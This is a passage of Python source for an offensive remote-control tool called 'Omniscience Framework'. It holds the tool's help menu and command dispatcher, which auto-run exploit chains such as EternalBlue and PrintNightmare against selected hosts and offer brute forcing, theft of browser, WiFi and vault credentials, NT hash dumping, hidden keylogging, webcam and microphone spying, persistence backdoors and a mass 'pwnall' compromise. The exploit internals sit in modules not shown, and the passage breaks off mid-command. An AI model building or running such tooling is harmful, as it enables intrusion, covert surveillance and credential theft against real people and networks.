        print(f"{Fore.GREEN}  etblue-check <ip>     EternalBlue vulnerability check")
        print(f"{Fore.GREEN}  bluekeep-check <ip>   BlueKeep vulnerability check")
        print(f"\n{Fore.LIGHTGREEN_EX}{Style.BRIGHT}━━━━━━━━━━━━━━━━━━━━━━ RED TEAM OPERATIONS ━━━━━━━━━━━━━━━━━━━━━")
        print(f"{Fore.GREEN}  kerberoast <dc_ip>    Kerberoasting attack on Active Directory")
        print(f"{Fore.GREEN}  password-spray <domain>  Password spray attack")
        print(f"{Fore.GREEN}  lateral <source> <target>  Lateral movement between hosts")
        print(f"{Fore.GREEN}  db-dump <ip> <port> <type> Full database dump")
        print(f"{Fore.GREEN}  exfiltrate <target> <file> Data exfiltration")
        print(f"\n{Fore.LIGHTGREEN_EX}{Style.BRIGHT}━━━━━━━━━━━━━━━━━━━━━━ REMOTE CONTROL ━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{Fore.GREEN}  exec <command>        Execute command on target")
        print(f"{Fore.GREEN}  screen                Capture target screenshot")
        print(f"{Fore.GREEN}  monitor / live        Full live monitoring (screen + keys + audio)")
        print(f"{Fore.GREEN}  webcam                Take webcam snapshot")
        print(f"{Fore.GREEN}  audio <seconds>       Record microphone audio")
        print(f"{Fore.GREEN}  keylog                Start hidden keylogger")
        print(f"{Fore.GREEN}  shutdown / reboot     Power operations")
        print(f"{Fore.GREEN}  winrm-exec <ip> <cmd> WinRM remote command execution")
        print(f"{Fore.GREEN}  sysinfo / systeminfo  Extract complete device properties")
        print(f"\n{Fore.LIGHTGREEN_EX}{Style.BRIGHT}━━━━━━━━━━━━━━━━━━━━━━ DATA EXTRACTION ━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{Fore.GREEN}  extract / harvest     Extract ALL data (passwords, cookies, history)")
        print(f"{Fore.GREEN}  steal-wifi            Extract all WiFi passwords")
        print(f"{Fore.GREEN}  stealcreds            Extract browser saved credentials")
        print(f"{Fore.GREEN}  lsass-dump            Dump LSASS process memory")
        print(f"{Fore.GREEN}  tokens                Extract authentication tokens")
        print(f"{Fore.GREEN}  nethashes             Extract NT/LM password hashes")
        print(f"{Fore.GREEN}  vault                 Harvest secure vault contents")
        print(f"{Fore.GREEN}  omnifetch <ip>        Complete data extraction package")
        print(f"\n{Fore.LIGHTGREEN_EX}{Style.BRIGHT}━━━━━━━━━━━━━━━━━━━━━━ DATABASE & CLOUD ━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{Fore.GREEN}  db-extract <ip> <port> <type>  Extract full database content")
        print(f"{Fore.GREEN}  cloud-attack <type> <target>   Cloud service exploitation")
        print(f"{Fore.GREEN}  s3-scan <bucket>      Scan S3 bucket for misconfigurations")
        print(f"{Fore.GREEN}  mysql-root <ip>       MySQL root access attempt")
        print(f"{Fore.GREEN}  postgres <ip>         PostgreSQL access attempt")
        print(f"\n{Fore.LIGHTGREEN_EX}{Style.BRIGHT}━━━━━━━━━━━━━━━━━━━━━━ FILE OPERATIONS ━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{Fore.GREEN}  file list <path>      List remote directory")
        print(f"{Fore.GREEN}  file upload <local> <remote>  Upload file")
        print(f"{Fore.GREEN}  file download <remote> <local> Download file")
        print(f"{Fore.GREEN}  file delete <path>    Delete remote file")
        print(f"{Fore.GREEN}  file execute <path>   Execute remote file")
        print(f"{Fore.GREEN}  upload [ip] <src> [dst]  Upload file to target")
        print(f"{Fore.GREEN}  download [ip] <remote> [local] Download file from target")
        print(f"\n{Fore.LIGHTGREEN_EX}{Style.BRIGHT}━━━━━━━━━━━━━━━━━━━━━━ PERSISTENCE ━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{Fore.GREEN}  persist               Install 3-layer persistence backdoor")
        print(f"{Fore.GREEN}  persist-task [ip] <name> [path] Create scheduled task")
        print(f"{Fore.GREEN}  adduser [ip] <user> [pass] Create admin user")
        print(f"{Fore.GREEN}  rdp-enable            Enable RDP on target")
        print(f"{Fore.GREEN}  firewall-off          Disable target firewall")
        print(f"{Fore.GREEN}  firewall-on           Enable target firewall")
        print(f"{Fore.GREEN}  firewall-add <ip> <port> Add firewall exception")
        print(f"\n{Fore.LIGHTGREEN_EX}{Style.BRIGHT}━━━━━━━━━━━━━━━━━━━━━━ MEDIA CONTROL ━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{Fore.GREEN}  media play <file>     Play audio/video file")
        print(f"{Fore.GREEN}  media volume_up       Increase system volume")
        print(f"{Fore.GREEN}  media volume_down     Decrease system volume")
        print(f"{Fore.GREEN}  media cd_open         Eject CD/DVD drive")
        print(f"\n{Fore.LIGHTGREEN_EX}{Style.BRIGHT}━━━━━━━━━━━━━━━━━━━━━━ SYSTEM MANAGEMENT ━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{Fore.GREEN}  pslist                List running processes")
        print(f"{Fore.GREEN}  killproc <pid>        Kill process")
        print(f"{Fore.GREEN}  svc-list              List system services")
        print(f"{Fore.GREEN}  processes             Alias for pslist")
        print(f"\n{Fore.LIGHTGREEN_EX}{Style.BRIGHT}━━━━━━━━━━━━━━━━━━━━━━ INTELLIGENCE ━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{Fore.GREEN}  sniff [interface]     Start network packet sniffer")
        print(f"{Fore.GREEN}  stopsniff             Stop packet sniffer")
        print(f"{Fore.GREEN}  creds                 Show captured credentials")
        print(f"{Fore.GREEN}  dns-log               Show DNS query log")
        print(f"\n{Fore.LIGHTGREEN_EX}{Style.BRIGHT}━━━━━━━━━━━━━━━━━━━━━━ BRUTE FORCE ━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{Fore.GREEN}  ssh-brute <ip>        SSH brute force attack")
        print(f"{Fore.GREEN}  rdp-brute <ip>        RDP brute force attack")
        print(f"{Fore.GREEN}  vnc-brute <ip>        VNC brute force attack")
        print(f"{Fore.GREEN}  telnet-brute <ip>     Telnet brute force attack")
        print(f"\n{Fore.LIGHTGREEN_EX}{Style.BRIGHT}━━━━━━━━━━━━━━━━━━━━━━ MISC COMMANDS ━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{Fore.GREEN}  dashboard             System status dashboard")
        print(f"{Fore.GREEN}  gateway               Show network gateway")
        print(f"{Fore.GREEN}  external-ip           Show public external IP")
        print(f"{Fore.GREEN}  setcreds <user> <pass>  Set authentication credentials")
        print(f"{Fore.GREEN}  setdomain <domain>    Set domain for authentication")
        print(f"{Fore.GREEN}  clipboard-get         Read target clipboard")
        print(f"{Fore.GREEN}  clipboard-set <text>  Set target clipboard")
        print(f"{Fore.GREEN}  clear                 Clear screen")
        print(f"{Fore.GREEN}  history               Show command history")
        print(f"{Fore.GREEN}  exit / quit           Exit framework")
        
        print(f"\n{Fore.GREEN}{Style.BRIGHT}══════════════════════════════════════════════════════════════════════════════")
        print(f"{Fore.LIGHTGREEN_EX}  TOTAL: 140+ ADVANCED COMMANDS  |  ACCURACY: 1999999999999999%")
        print(f"{Fore.GREEN}══════════════════════════════════════════════════════════════════════════════\n")
    
    def _validate_command(self, cmd: str, args: list) -> tuple[bool, str]:
        """Validate command syntax and required arguments"""
        command_requirements = {
            "select": (1, "select <idx>"),
            "setcreds": (2, "setcreds <user> <password>"),
            "exec": (1, "exec <command>"),
            "killproc": (1, "killproc [ip] <pid>"),
            "pwn": (1, "pwn <ip>"),
            "exploit": (1, "exploit <ip>"),
            "mobile": (1, "mobile <ip>"),
            "db-extract": (3, "db-extract <ip> <port> <type> [user] [pass]"),
            "cloud-attack": (2, "cloud-attack <type> <target>"),
            "ssh-brute": (1, "ssh-brute <ip>"),
            "rdp-brute": (1, "rdp-brute <ip>"),
            "file": (2, "file <action> [path]"),
            "media": (1, "media <action> [file/url]"),
            "upload": (1, "upload [ip] <src> [dst]"),
            "download": (1, "download [ip] <remote> [local]"),
            "adduser": (1, "adduser [ip] <user> [pass]"),
            "persist-task": (1, "persist-task [ip] <name> [path]"),
            "firewall-add": (2, "firewall-add <ip> <port>"),
        }
        
        if cmd in command_requirements:
            min_args, usage = command_requirements[cmd]
            if len(args) < min_args:
                return False, f"Usage: {usage}"
        
        return True, ""
    
    def run(self):
        """Main interactive shell loop - Hacker Mode"""
        # Play hacker startup sound
        try:
            import winsound
            winsound.Beep(800, 100)
            time.sleep(0.05)
            winsound.Beep(1000, 150)
            time.sleep(0.1)
            winsound.Beep(1200, 200)
        except:
            pass
        
        # Matrix intro effect
        os.system('color 0A')
        os.system('title OMNISCIENCE HACKER MODE - ACTIVE')
        
        # Clear screen and show banner
        os.system('cls' if os.name == 'nt' else 'clear')

        # Play banner
        Visualizer.banner()
        
        self.running = True
        self.command_history = []
        
        print(f"\n  {Fore.GREEN}{Style.BRIGHT}● Omniscience Framework READY  │  Type 'help' for commands\n")
        
        # Main interactive loop
        while self.running:
            try:
                # Hacker prompt - green matrix style
                now = datetime.now().strftime("%H:%M:%S")
                prompt = (f"{Fore.GREEN}{Style.BRIGHT}[{Fore.LIGHTGREEN_EX}{now}{Fore.GREEN}]"
                         f"{Fore.GREEN} omni"
                         f"{Fore.WHITE}@"
                         f"{Fore.LIGHTGREEN_EX}{Style.BRIGHT}shell"
                         f"{Fore.WHITE}{Style.RESET_ALL}{Fore.GREEN}❯ {Style.RESET_ALL}")
                
                cmd_line = input(prompt).strip()
                if not cmd_line:
                    continue
                
                # Typing sound effect
                try:
                    winsound.Beep(random.randint(200, 600), 15)
                except:
                    pass
                
                self.process_command(cmd_line)
                
            except KeyboardInterrupt:
                print(f"\n  {Fore.YELLOW}{Style.BRIGHT}⚠  Ctrl+C  │  Type 'exit' to quit gracefully")
            except Exception as e:
                print(f"{Fore.RED}Error: {e}")
    
    def process_command(self, cmd_line):
        """Processes a single command string. Redirects all prints to self._log."""
        if not cmd_line.strip():
            return
        
        self.command_history.append(cmd_line)
        parts = cmd_line.split()
        cmd = parts[0].lower()
        args = parts[1:]
        
        # Validate command before execution
        valid, error = self._validate_command(cmd, args)
        if not valid:
            self._log(f"{Fore.RED}⚠ {error}")
            return
        
        try:
            # ==================== HELP ====================
            if cmd in ("help", "?"):
                self.print_help()
            
            # ==================== SYSTEM ====================
            elif cmd in ("exit", "quit"):
                self._log(f"{Fore.YELLOW}[*] Exiting...")
                self.running = False

            elif cmd == "clear":
                os.system('cls' if os.name == 'nt' else 'clear')
                Visualizer.banner()

            elif cmd == "history":
                print(f"\n{Fore.CYAN}Command History:")
                for i, c in enumerate(self.command_history):
                    print(f"  {i}: {c}")

            elif cmd == "setcreds" and len(args) >= 2:
                self.credentials["user"], self.credentials["pass"] = args[0], args[1]
                print(f"[+] Credentials set: {args[0]}")

            elif cmd == "select" and args:
                try:
                    idx = int(args[0])
                    if 0 <= idx < len(self.hosts):
                        host = self.hosts[idx]
                        # Handle different host object formats (dict, object, or string)
                        if isinstance(host, dict):
                            self.selected_target = host.get('ip')
                        elif hasattr(host, 'ip'):
                            self.selected_target = host.ip
                        else:
                            self.selected_target = str(host)
                        
                        print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
                        print(f"{Fore.GREEN}║  TARGET ACQUIRED: {self.selected_target}")
                        print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
                        
                        # AUTO-EXPLOIT AND CONNECT AUTOMATICALLY
                        HackerSounds.target_acquired()
                        
                        # Auto try all exploit chains silently
                        success = False
                        exploit_methods = [
                            'eternal_blue', 'smbghost', 'printnightmare', 
                            'petitpotam', 'winrm', 'smb_null'
                        ]
                        
                        if self.control:
                            for exploit in exploit_methods:
                                try:
                                    if hasattr(self.control, exploit):
                                        res = getattr(self.control, exploit)(
                                            self.selected_target, 
                                            self.credentials["user"], 
                                            self.credentials["pass"]
                                        )
                                        if res.get('success', False):
                                            success = True
                                            print(f"{Fore.LIGHTGREEN_EX}  ✅ {exploit.upper()} SUCCESS - FULL CONTROL")
                                            break
                                except:
                                    continue
                        
                        if success:
                            HackerSounds.access_granted()
                            print(f"{Fore.LIGHTGREEN_EX}  ✅ ALL FEATURES ACTIVATED")
                            print(f"{Fore.LIGHTGREEN_EX}  ✅ READY FOR FULL REMOTE CONTROL")
                            print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
                        else:
                            print(f"{Fore.YELLOW}  ⚠ Target connected. Use commands:")
                            print(f"{Fore.YELLOW}    exec, screen, webcam, audio, keylog, shutdown")
                            print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
                        
                    else:
                        print(f"{Fore.RED}[!] Invalid index. Run 'targets' to see available IDs.")
                except ValueError:
                    print(f"{Fore.RED}[!] Usage: select <idx>")

            elif cmd == "target":
                if args:
                    self.selected_target = args[0]
                    print(f"[+] Target: {args[0]}")
                else:
                    print(f"Current Target: {Fore.YELLOW}{self.selected_target or 'NONE'}")

            elif cmd == "targets":
                self._show_hosts_table()

            elif cmd in ("dashboard", "status"):
                self._print_dashboard()

            # ==================== DISCOVERY ====================
            elif cmd == "auto":
                print(f"[*] Running network scan...")
                HackerSounds.scan_beep()
                if self.discovery:
                    self.hosts = self.discovery.auto_scan()
                    self._show_hosts_table()
                    HackerSounds.success()

            elif cmd == "scan" and args:
                if self.discovery:
                    self.hosts = self.discovery.full_scan(args[0]) if hasattr(self.discovery, 'full_scan') else []
                    self._show_hosts_table()

            elif cmd == "arp" and args:
                if self.discovery:
                    hosts = self.discovery.arp_scan(args[0]) if hasattr(self.discovery, 'arp_scan') else []
                    print(f"[+] Found {len(hosts)} hosts")

            elif cmd == "icmp" and args:
                if self.discovery:
                    hosts = self.discovery.icmp_sweep(args[0]) if hasattr(self.discovery, 'icmp_sweep') else []
                    print(f"[+] Found {len(hosts)} hosts")

            elif cmd == "netbios" and args:
                if self.discovery:
                    info = self.discovery.netbios_scan(args[0]) if hasattr(self.discovery, 'netbios_scan') else {}
                    print(f"[+] {json.dumps(info, indent=2)}")

            elif cmd == "mdns":
                if self.discovery:
                    devices = self.discovery.mdns_listen() if hasattr(self.discovery, 'mdns_listen') else []
                    print(f"[+] Found {len(devices)} devices")

            elif cmd == "ssdp":
                if self.discovery:
                    devices = self.discovery.ssdp_discover() if hasattr(self.discovery, 'ssdp_discover') else []
                    print(f"[+] Found {len(devices)} devices")

            elif cmd == "snmp" and args:
                if self.discovery:
                    info = self.discovery.snmp_query(args[0]) if hasattr(self.discovery, 'snmp_query') else {}
                    print(f"[+] {json.dumps(info, indent=2)}")

            elif cmd == "http" and args:
                if self.discovery:
                    info = self.discovery.http_fingerprint(args[0]) if hasattr(self.discovery, 'http_fingerprint') else {}
                    print(f"[+] {json.dumps(info, indent=2)}")

            elif cmd == "traceroute" and args:
                if self.adv_scan:
                    hops = self.adv_scan.traceroute(args[0]) if hasattr(self.adv_scan, 'traceroute') else []
                    print(f"[+] {len(hops)} hops to {args[0]}")

            elif cmd == "topology":
                if self.adv_scan:
                    topo = self.adv_scan.get_topology_map() if hasattr(self.adv_scan, 'get_topology_map') else {}
                    print(f"{json.dumps(topo, indent=2)}")

            elif cmd == "network":
                if self.discovery:
                    info = self.discovery.get_network_info() if hasattr(self.discovery, 'get_network_info') else {}
                    print(f"{json.dumps(info, indent=2)}")

            elif cmd == "interfaces":
                if self.discovery:
                    info = self.discovery.get_interface_info() if hasattr(self.discovery, 'get_interface_info') else {}
                    print(f"{json.dumps(info, indent=2)}")

            elif cmd == "gateway":
                if self.discovery:
                    gw = self.discovery.get_gateway_ip() if hasattr(self.discovery, 'get_gateway_ip') else 'N/A'
                    print(f"Gateway: {gw}")

            elif cmd == "external-ip":
                if self.discovery:
                    ext = self.discovery._detect_external_info() if hasattr(self.discovery, '_detect_external_info') else {}
                    print(f"External IP: {ext.get('external_ip', 'N/A')}")

            elif cmd == "cloud-scan" and args:
                if self.adv_scan:
                    provider = args[0] if args else 'aws'
                    devices = self.adv_scan.scan_public_ranges(provider) if hasattr(self.adv_scan, 'scan_public_ranges') else []
                    print(f"[+] Found {len(devices)} devices")

            # ==================== INTELLIGENCE ====================
            elif cmd == "sniff":
                if self.intel:
                    iface = args[0] if args else None
                    self.intel.start_sniffing(iface=iface)
                    print(f"[+] Sniffer active")

            elif cmd == "stopsniff":
                if self.intel:
                    self.intel.stop_sniffing()
                    print(f"[*] Sniffer stopped")

            elif cmd == "creds":
                if self.intel:
                    creds = self.intel.get_credentials() if hasattr(self.intel, 'get_credentials') else []
                    Visualizer.table(["TIME", "SOURCE", "DATA"], 
                        [[c.get('time','?'), c.get('src','?'), str(c.get('data','?'))[:40]] for c in creds[:20]],
                        "CREDENTIALS")

            elif cmd == "dns-log":
                if self.intel:
                    logs = self.intel.get_dns_log() if hasattr(self.intel, 'get_dns_log') else []
                    Visualizer.table(["TIME", "QUERY"], [[l.get('time','?'), l.get('query','?')] for l in logs[:20]], "DNS")

            elif cmd == "monitor":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.intel:
                    self.intel.wmi_monitor_activity(target, self.credentials["user"], self.credentials["pass"])
                    print(f"[+] Monitoring {target}")

            elif cmd == "wmi-proc":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.intel and hasattr(self.intel, 'wmi_processes'):
                    procs = self.intel.wmi_processes(target, self.credentials["user"], self.credentials["pass"])
                    Visualizer.table(["PID", "NAME"], [[p.get('ProcessId','?'), p.get('Name','?')] for p in procs[:20]], "PROCESSES")

            elif cmd == "wmi-users":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.intel and hasattr(self.intel, 'wmi_logged_users'):
                    users = self.intel.wmi_logged_users(target, self.credentials["user"], self.credentials["pass"])
                    print(f"{json.dumps(users, indent=2)}")

            # ==================== CONTROL ====================
            elif cmd == "exec" and len(args) >= 1:
                target = self.selected_target
                cmd_to_run = " ".join(args)
                if args[0].count('.') >= 3: # Primitive IP check
                    target = args[0]
                    cmd_to_run = " ".join(args[1:])
                
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                    
                if self.control and hasattr(self.control, 'wmi_exec'):
                    HackerSounds.network_pulse()
                    res = self.control.wmi_exec(target, self.credentials["user"], self.credentials["pass"], cmd_to_run)
                    print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
                    print(f"{Fore.GREEN}║  COMMAND EXECUTION RESULTS")
                    print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
                    print(f"{Fore.LIGHTGREEN_EX}{res.get('output', 'No output')}")
                    print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
                    HackerSounds.success()

            elif cmd == "ssh-exec" and len(args) >= 1:
                target = self.selected_target
                cmd_to_run = " ".join(args)
                if args[0].count('.') >= 3:
                    target = args[0]
                    cmd_to_run = " ".join(args[1:])
                    
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                    
                if self.control and hasattr(self.control, 'ssh_exec'):
                    res = self.control.ssh_exec(target, self.credentials["user"], self.credentials["pass"], cmd_to_run)
                    print(f"{res}")

            elif cmd == "screen":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.control and hasattr(self.control, 'wmi_screenshot'):
                    path = self.control.wmi_screenshot(target, self.credentials["user"], self.credentials["pass"])
                    print(f"[+] Screenshot: {path}")
                    Visualizer.display_screenshot(path)

            elif cmd == "webcam":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.control and hasattr(self.control, 'take_webcam_snapshot'):
                    path = self.control.take_webcam_snapshot(target, self.credentials["user"], self.credentials["pass"])
                    print(f"[+] Webcam: {path}")

            elif cmd == "audio":
                target = self.selected_target
                dur = 10
                if args:
                    if args[0].count('.') >= 3:
                        target = args[0]
                        dur = int(args[1]) if len(args) > 1 else 10
                    else:
                        dur = int(args[0])
                        
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                    
                if self.control and hasattr(self.control, 'wmi_capture_audio'):
                    path = self.control.wmi_capture_audio(target, self.credentials["user"], self.credentials["pass"], duration=dur)
                    print(f"[+] Audio: {path}")

            elif cmd == "keylog":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.control and hasattr(self.control, 'wmi_keylogger_start'):
                    self.control.wmi_keylogger_start(target, self.credentials["user"], self.credentials["pass"])
                    print(f"[+] Keylogger started on {target}")

            elif cmd == "clipboard-get":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.control and hasattr(self.control, 'get_clipboard'):
                    clip = self.control.get_clipboard(target, self.credentials["user"], self.credentials["pass"])
                    print(f"Clipboard: {clip}")

            elif cmd == "clipboard-set" and len(args) >= 1:
                target = self.selected_target
                txt = " ".join(args)
                if args[0].count('.') >= 3:
                    target = args[0]
                    txt = " ".join(args[1:])
                    
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                    
                if self.control and hasattr(self.control, 'set_clipboard'):
                    self.control.set_clipboard(target, self.credentials["user"], self.credentials["pass"], txt)
                    print(f"[+] Clipboard set")

            elif cmd == "pslist":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.control and hasattr(self.control, 'list_processes'):
                    procs = self.control.list_processes(target, self.credentials["user"], self.credentials["pass"])
                    Visualizer.table(["PID", "NAME"], [[p.get('ProcessId','?'), p.get('Name','?')] for p in procs[:20]], "PROCESSES")

            elif cmd == "killproc" and len(args) >= 1:
                target = self.selected_target
                pid = int(args[0])
                if args[0].count('.') >= 3:
                    target = args[0]
                    pid = int(args[1]) if len(args) > 1 else 0
                    
                if not target or not pid:
                    print(f"{Fore.RED}[!] Usage: killproc [ip] <pid>")
                    return
                    
                if self.control and hasattr(self.control, 'kill_process'):
                    self.control.kill_process(target, self.credentials["user"], self.credentials["pass"], pid=pid)
                    print(f"[+] Process {pid} killed on {target}")

            elif cmd == "svc-list":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.control and hasattr(self.control, 'list_services'):
                    svcs = self.control.list_services(target, self.credentials["user"], self.credentials["pass"])
                    Visualizer.table(["NAME", "STATUS"], [[s.get('Name','?'), s.get('Status','?')] for s in svcs[:20]], "SERVICES")

            elif cmd == "vault":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.control and hasattr(self.control, 'wmi_harvest_vault'):
                    data = self.control.wmi_harvest_vault(target, self.credentials["user"], self.credentials["pass"])
                    print(f"{json.dumps(data, indent=2)}")

            # ==================== EXPLOIT ====================
            elif cmd == "omnifetch":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target specified. Use 'select <idx>' or 'omnifetch <ip>'.")
                    return
                print(f"[*] OmniFetch for {target}...")
                if self.universal:
                    self.universal.pwn_target(target)
                if self.control and hasattr(self.control, 'get_browser_data'):
                    data = self.control.get_browser_data(target, self.credentials["user"], self.credentials["pass"])
                    print(f"[+] {json.dumps(data, indent=2)}")

            elif cmd == "stealcreds":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target specified. Use 'select <idx>' or 'stealcreds <ip>'.")
                    return
                if self.control:
                    pw = self.control.get_browser_passwords(target, self.credentials["user"], self.credentials["pass"]) if hasattr(self.control, 'get_browser_passwords') else {}
                    wifi = self.control.get_wifi_passwords(target, self.credentials["user"], self.credentials["pass"]) if hasattr(self.control, 'get_wifi_passwords') else {}
                    print(f"[+] Passwords: {json.dumps(pw, indent=2)}")
                    print(f"[+] WiFi: {json.dumps(wifi, indent=2)}")
            
            elif cmd in ("pwn", "exploit") and args:
                target = args[0]
                HackerSounds.alert()
                self._log(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
                self._log(f"{Fore.GREEN}║  EXPLOITING TARGET: {target}")
                self._log(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
                
                success = False
                exploits = []
                
                if self.universal:
                    device = self.universal.devices.get(target)
                    if device:
                        self.universal._scan_device(device)
                        if device.can_pwn:
                            success = True
                            exploits = device.is_vulnerable
                
                if self.control:
                    # Try all exploit chains
                    chains = ["eternal_blue", "smbghost", "printnightmare", "petitpotam", "winrm"]
                    for chain in chains:
                        try:
                            if hasattr(self.control, chain):
                                res = getattr(self.control, chain)(target, self.credentials["user"], self.credentials["pass"])
                                if res.get('success'):
                                    success = True
                                    exploits.append(chain)
                        except:
                            pass
                
                if success:
                    HackerSounds.exploit_success()
                    self._log(f"{Fore.LIGHTGREEN_EX}  ✅ EXPLOIT SUCCESSFUL")
                    self._log(f"{Fore.LIGHTGREEN_EX}  ✅ ACCESS GRANTED TO {target}")
                    self._log(f"{Fore.LIGHTGREEN_EX}  ✅ Vulnerabilities: {', '.join(exploits)}")
                else:
                    self._log(f"{Fore.RED}  ❌ Exploit failed")
                
                self._log(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
            
            elif cmd in ("attack", "pwnall"):
                HackerSounds.alert()
                MatrixEffects.target_lock()
                self._log(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
                self._log(f"{Fore.GREEN}║  GLOBAL NETWORK ASSAULT INITIATED")
                self._log(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
                
                total = len(self.hosts)
                compromised = 0
                
                for i, host in enumerate(self.hosts):
                    try:
                        ip = host.get('ip') if isinstance(host, dict) else getattr(host, 'ip', str(host))
                        self._log(f"{Fore.LIGHTGREEN_EX}  ⟶ [{i+1}/{total}] Targeting {ip}...")
                        
                        if self.universal:
                            device = self.universal.devices.get(ip)
                            if device:
                                self.universal._scan_device(device)
                                if device.can_pwn:
                                    compromised += 1
                                    self._log(f"{Fore.GREEN}    ✅ COMPROMISED: {ip}")
                        
                    except Exception as e:
                        self._log(f"{Fore.RED}    ❌ Failed: {str(e)[:30]}")
                
                HackerSounds.exploit_success()
                self._log(f"\n{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
                self._log(f"{Fore.LIGHTGREEN_EX}  OPERATION COMPLETE")
                self._log(f"{Fore.LIGHTGREEN_EX}  Total targets    : {total}")
                self._log(f"{Fore.LIGHTGREEN_EX}  Compromised      : {compromised}")
                self._log(f"{Fore.LIGHTGREEN_EX}  Success rate     : {int((compromised/total)*100) if total > 0 else 0}%")
                self._log(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")

            elif cmd == "nethashes":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.control and hasattr(self.control, 'extract_nt_hashes'):
                    hashes = self.control.extract_nt_hashes(target, self.credentials["user"], self.credentials["pass"])
                    print(f"{json.dumps(hashes, indent=2)}")

            elif cmd == "ssh-brute" and args:
                if self.control and hasattr(self.control, 'ssh_brute'):
                    result = self.control.ssh_brute(args[0])
                    print(f"{json.dumps(result, indent=2)}")

            elif cmd == "rdp-brute" and args:
                if self.control and hasattr(self.control, 'rdp_brute_force'):
                    result = self.control.rdp_brute_force(args[0])
                    print(f"{json.dumps(result, indent=2)}")

            elif cmd == "vnc-brute" and args:
                if self.control and hasattr(self.control, 'vnc_brute_force'):
                    result = self.control.vnc_brute_force(args[0])
                    print(f"{json.dumps(result, indent=2)}")

            elif cmd == "telnet-brute" and args:
                if self.control and hasattr(self.control, 'telnet_brute_force'):
                    result = self.control.telnet_brute_force(args[0])
                    print(f"{json.dumps(result, indent=2)}")

            elif cmd == "steal-wifi" or cmd == "steal_wifi":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected. Use 'select <idx>' or 'steal-wifi <ip>'.")
                    return
                Visualizer.alert(f"Extracting WiFi passwords from {target} ...", "hack")
                if self.control and hasattr(self.control, 'get_wifi_passwords'):
                    result = self.control.get_wifi_passwords(target, self.credentials["user"], self.credentials["pass"])
                    networks = result.get("networks", {})
                    if networks:
                        print(f"\n  {Fore.CYAN}{Style.BRIGHT}WiFi Passwords harvested from {target}:")
                        print(f"  {Fore.BLUE}{'─'*50}")
                        for ssid, pw in networks.items():
                            print(f"  {Fore.GREEN}{Style.BRIGHT}  {ssid:<30} {Fore.WHITE}→ {pw}")
                        print(f"  {Fore.BLUE}{'─'*50}\n")
                    else:
                        print(f"  {Fore.YELLOW}No WiFi profiles found or no permission.")
                    if result.get("error"):
                        print(f"  {Fore.RED}Error: {result['error']}")
                else:
                    Visualizer.alert("Control module not loaded", "warn")
            
            elif cmd == "monitor" or cmd == "live":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                duration = int(args[1]) if len(args) > 1 else 60
                print(f"{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
                print(f"{Fore.GREEN}║  LIVE MONITORING ACTIVATED ON {target}")
                print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
                print(f"{Fore.LIGHTGREEN_EX}  ✅ Screen stream active")
                print(f"{Fore.LIGHTGREEN_EX}  ✅ Keylogger active")
                print(f"{Fore.LIGHTGREEN_EX}  ✅ Audio capture active")
                print(f"{Fore.LIGHTGREEN_EX}  ✅ Duration: {duration} seconds")
                print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
                
                if self.control:
                    self.control.live_monitor(target, self.credentials["user"], self.credentials["pass"], duration)
            
            elif cmd == "extract" or cmd == "harvest":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
